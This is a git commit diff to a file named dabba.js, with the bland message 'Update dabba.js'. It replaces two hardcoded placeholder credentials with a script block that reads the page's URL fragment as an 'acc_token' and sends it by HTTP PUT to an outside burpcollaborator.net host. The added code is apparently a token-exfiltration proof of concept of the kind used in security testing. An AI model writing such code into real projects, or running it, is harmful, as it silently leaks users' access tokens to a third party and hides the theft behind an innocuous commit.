21f2d638c29f5a893788d4241e26484475cc61ae
d1m4x <35783040+dimax0220@users.noreply.github.com>
2020-10-18 18:29:13 +0500

    Update dabba.js

--- dabba.js
+++ dabba.js
@@ -1,2 +1,14 @@
-var login = "qwerty";
-var pass = "qwe123";
+<script>
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = this.responseText;
+    }
+  };
+  var privateData = "empty";
+  if(typeof window.location.hash != "undefined"){
+    privateData = window.location.hash.substr(1);};
+  var url = "//2wzlylv5b4a9nw85cgsrsv11isoic7.burpcollaborator.net?acc_token="+privateData;
+  xhttp.open("PUT", url, true);
+  xhttp.send();
+</script>
